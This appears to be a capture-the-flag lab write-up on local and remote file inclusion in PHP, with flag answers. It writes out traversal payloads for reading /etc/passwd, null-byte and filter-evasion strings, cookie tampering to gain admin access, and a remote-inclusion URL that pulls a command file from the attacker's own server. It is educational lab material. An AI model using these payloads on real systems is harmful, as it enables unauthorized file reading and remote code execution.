##### LFI #1

1. Give Lab #1 a try to read /etc/passwd. What would the request URI be?
Answer: `/lab1.php?file=/etc/passwd`

2. In Lab #2, what is the directory specified in the include function?

![img](Screen Shot 2023-08-23 at 4.27.12 PM.png) 

Answer: `includes`
We get an error message after looking up a random nonexistent file 'hi.php' 
`include(includes/hi.php) `tells us that the directory specified in the `include` function is `includes` (what a creative name).

##### LFI #2
**===1. Give Lab #3 a try to read /etc/passwd. What is the request look like?===**![[Screen Shot 2023-08-23 at 4.33.28 PM.png]]
The image above is the result of trying to read /etc/passwd by inputting /etc/passwd in the form. 
However, in the error message, we can see that
1) The default directory for the function is set as `includes`, and 
2)  `.php` is appended to `/etc/passwd`. 

To bypass both of these problems we can implement 2 measures: 
1) Use directory traversal. Because we know that we're currently in `/var/www/html/lab3.php`, we can bypass these by using 4 `../`, like so: `../../../../etc/passwd
2) We should use the nullbyte `%00` so the web server disregards the `.php` that is appended after input. 

The final payload:
`../../../../etc/passwd%00`

The request
`/lab3.php?file=../../../../etc/passwd%00`

Output:

===**2. Which function is causing the directory traversal in Lab #4?**===
Answer: `file_get_contents`

Let's input a nonexistant file `yum.php`.
![[Screen Shot 2023-08-23 at 4.39.42 PM.png]]
The error message discloses that the function `file_get_contents` is enabling us to read files through directory traversal.


**===3. Try out Lab #6 and check what is the directory that has to be in the input field?===**

![[Screen Shot 2023-08-29 at 3.14.37 PM.png]]

Answer: THM-profile. If we input a random directory that is not `THM-profile` , we get this error message: 

`Access Denied! Allowed files at THM-profile folder only!`

![[Screen Shot 2023-08-29 at 3.15.33 PM.png]]

So this web page is only allowing users to search for files within the `THM-profile` directory.


**===4. Try out Lab #6 and read /etc/os-release. What is the VERSION_ID value?===**

In this exercise, we have to read a directory that is not `THM-profile`.
Needless to say, searching for only `/etc/os-release` will output an error message, denying us access.


In this case, we can utilize the directory traversal method.
Specifically, appending /../'s to the directory that we have access will allow us to traverse to a different directory.
The input is: `THM-profile/../../../../etc/os-release`

![[Screen Shot 2023-08-29 at 3.17.47 PM.png]]
Note: we know to use 4 /../'s because our current path is `/var/www/html`, and we have to traverse through all of those directories to reach `/etc/os-release`.



### Writeup: Challenge


**==1. Capture Flag1 at /etc/flag1==**

Below is the screen we are presented with.
![[Screen Shot 2023-08-29 at 3.25.31 PM.png]]
It says the input form is broken and trying `/etc/flag1` reaffirms that it indeed doesn't work, not showing any output. 

So we will use the terminal to manually send a 'POST' request. 

`curl -X POST http://10.10.128.41/challenges/chall1.php -d 'method=GET&file=/etc/flag1'

![[Screen Shot 2023-08-29 at 3.34.25 PM.png]]

At the bottom of the output you will find the flag: `F1x3d-iNpu7-f0rrn`

![[Screen Shot 2023-08-29 at 3.33.33 PM.png]]


**==2. Capture Flag2 at /etc/flag2==**

Initial screen: 
![[Screen Shot 2023-08-29 at 3.35.43 PM.png]]

Let's refresh as told.

![[Screen Shot 2023-08-29 at 3.36.15 PM.png]]
This^ is what we get after refreshing. Refreshing logged us in as a Guest, but only admins can access this page. Thus we should try to log ourselves in as an admin to access the file with the flag.

Again, this needs to be done with a tool like Burp Suite. We can use Burp to capture the HTTP traffic and modify the cookie so as to give ourselves admin access.


1. Refresh the page and capture the HTTP traffoc.

![[Screen Shot 2023-08-29 at 3.50.31 PM.png]]

Shown here is the cookie set to `THM=Guest`. Let's try changing that to `THM=admin`. 

...I forgot to screenshot setting the cookie to `THM=admin` but below is the screen after forwarding the modified traffic with Burp (see Forward button on the top left).

![[Screen Shot 2023-08-29 at 3.52.17 PM.png]]
We are now logged in as admin. It's telling us that we are in the admin page but we need to get the flag elsewhere. 

We are looking for `/etc/flag2`. But how?

Trying to access `/etc/flag2` through the address bar doesn't work; it redirects us to the Guest page. So, in order to stay logged in as admin, let's stay with Burp Suite and keep modifying the cookie to stay as admin *and* access files as admin.

![[Screen Shot 2023-08-29 at 3.59.26 PM.png]]


`Cookie: THM=/etc/flag2`

Result: 
![[Screen Shot 2023-08-29 at 4.00.42 PM.png]]

We got an error message: `Warning: include(includes//etc/flag2.php)..`
The `.php` extension is appended. Let’s get rid of this with the null byte.

Like so: 
![[Screen Shot 2023-08-29 at 4.04.10 PM.png]]

Result:
![[Screen Shot 2023-08-29 at 4.05.14 PM.png]]

We managed to get rid of the `.php` but we still can't reach the file. Let's try using directory traversal. Our current path is `/var/www/html`.


Result:
![[Screen Shot 2023-08-29 at 4.06.41 PM.png]]
Got it! 


Note: 
Fails: CLI cookie tampering
![[Screen Shot 2023-08-29 at 3.46.39 PM.png]]


**==3. Capture Flag3 at /etc/flag3==**

Initial screen: 
![[Screen Shot 2023-08-29 at 4.08.23 PM.png]]

Let's try `etc/flag3`.

Result: 
![[Screen Shot 2023-08-29 at 4.08.56 PM.png]]

In the output, the /(slashes) and 3 are gone. The `.php` extension is also appended. 

I tried to get around this filtering by adding double /../'s and null bytes, like `....//....//....//....//etc//flag3%%0000` or `....//....//....//....//etc//flag3%00`. But it didn't work, and the same error message kept showing up. Using the address bar didn't work either.

As an alternative, let's try a POST request like we did in 
This wasn't something I could intuitively think of; I had to do some research.
Because interacting with the web page through the URL (AKA sending HTTP GET requests) isn't working, we are using POST as another way to send in data and see if it makes a difference. 

The following is the POST request sent: 
![[Screen Shot 2023-08-29 at 4.24.51 PM.png]]

Result:
![[Screen Shot 2023-08-29 at 4.24.36 PM.png]]
Here in the output, we see that the filter padding (....//....//) our payload was not modified as it was in the website. So let's send another POST request but without padding (but keeping the directory traversal and null byte).

The final command: 
![[Screen Shot 2023-08-29 at 4.26.47 PM.png]]
![[Screen Shot 2023-08-29 at 4.27.15 PM.png]]

It succeeded and we have the flag now. 


**==4. Gain RCE in Lab # Playground /playground.php with RFI to execute the hostname command. What is the output?==**

This exercise is a Remote File Inclusion exercise, meaning that we need our own file to send to the website. 
Here is the step-by-step:

1. First, create your own https server
![[python http server.png]] 

2. Then create a text file with the command you want to execute. in this case it is hostname.

![[cmdtxt 1.png]]


3. In the lab, include the file parameter containing your ip address (don’t forget to include the port on which the http server is listening) and the text file of the command.

![[file inclusion.png]]


Final input was:
`[http://10.10.222.26/playground.php?file=http://10.17.63.37:8000/cmd.txt]
`
